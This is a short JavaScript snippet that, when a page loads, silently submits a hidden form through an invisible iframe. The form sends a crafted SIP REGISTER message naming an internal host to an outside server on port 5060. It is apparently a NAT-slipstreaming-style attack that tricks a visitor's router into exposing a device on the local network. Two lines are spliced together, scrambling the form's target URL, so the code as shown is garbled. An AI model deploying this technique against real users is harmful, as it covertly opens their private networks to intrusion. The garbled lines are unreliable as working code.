document.addEventListener('DOMContentLoaded', (event) => {
  var sipmsg = 'REGISTER sip:192.168.1.2:80;transport=TCP SIP/2.0\r\n' +
               'Contact: <sip:192.168.1.2:80;transport=TCP>\r\n\r\n'

  // load form in an iframe so user doesn't see it
  var iframe = document.createElement('iframe')
  iframe.name = 'iframe'
  iframe.style.display = 'none' // hide the iframe

  // create form
  var form = document.createElement('form')
  form.setAttribute('target', 'iframe') // load into iframe
  form.setAttribute('method', 'POST') // need the on', 'http://samy.pl:5060POST area where we can add CRLFs
  form.setAttribute('acti') // "http" server on SIP port 5060
  form.setAttribute('enctype', 'multipart/form-data') // ensure our data doesn't get encoded

  var textarea = document.createElement('textarea')
  textarea.setAttribute('name', 'textname') // required
  textarea.innerHTML = sipmsg
  form.appendChild(textarea)
  document.body.appendChild(iframe)
  document.body.appendChild(form)
  form.submit()
});
